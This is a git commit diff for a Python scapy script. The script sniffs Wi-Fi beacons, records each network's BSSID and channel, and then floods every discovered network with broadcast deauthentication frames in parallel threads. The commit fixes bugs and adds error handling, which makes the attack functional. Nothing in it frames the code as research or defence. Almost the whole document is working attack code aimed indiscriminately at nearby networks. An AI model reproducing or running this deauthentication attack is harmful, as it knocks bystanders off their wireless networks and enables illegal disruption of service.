48d0f67f1132d209e4c444b71889090f609d3ee7
FoXhack1 <fox.pclyc@gmail.com>
2024-10-19 02:34:45 +0200

    Update wifi (1).py

--- wifi (1).py
+++ wifi (1).py
@@ -1,15 +1,16 @@
 import os
-
-from scapy.all import *
 import json
+import threading
+from scapy.all import *
 
 networks = []
 
 def write_networks():
-    # Open the file in write mode
-    with open("wifi_networks.json", "w") as f:
-        # Write the JSON data to the file
-        json.dump(networks, f, indent=4)  # Use json.dump instead of json.dumps
+    try:
+        with open("wifi_networks.json", "w") as f:
+            json.dump(networks, f, indent=4)
+    except Exception as e:
+        print(f"Error writing to JSON file: {e}")
 
 def WifiEnumeration(packet):
     if packet.haslayer(Dot11Beacon):
@@ -29,27 +30,34 @@ def WifiEnumeration(packet):
             networks.append(data)
 
 def deauth_attack(ap_mac, channel):
-    os.system(f"iwconfig wlan1 channel {channel}")
-    packet = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
+    try:
+        os.system(f"iwconfig wlan1 channel {channel}")
+        packet = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
 
-    for i in range(1000):
-        send(packet, iface="wlan1", verbose=0)
+        for i in range(1000):
+            send(packet, iface="wlan1", verbose=0)
+    except Exception as e:
+        print(f"Error performing deauthentication attack: {e}")
 
+def read_saved_networks():
+    try:
+        with open("wifi_networks.json", "r") as f:
+            return json.loads(f.read())
+    except Exception as e:
+        print(f"Error reading from JSON file: {e}")
+        return []
 
 if __name__ == "__main__":
     sniff(prn=WifiEnumeration, iface="wlan1", timeout=5)
     write_networks()
 
-    saved_networks = []
-    while ("wifi_networks.json", "r") as f:
-        saved_networks = json.loads(f.read())
-
+    saved_networks = read_saved_networks()
 
     for net in saved_networks:
         ap_mac = net['bssid']
         channel = net['channel']
         ssid = net['ssid']
         print(f"Trying to deauthenticate {ssid}..")
-        deauther = Thread(target=deauth_attack, args={ap_mac, channel})
+        deauther = threading.Thread(target=deauth_attack, args=(ap_mac, channel))
         deauther.daemon = True
         deauther.start()
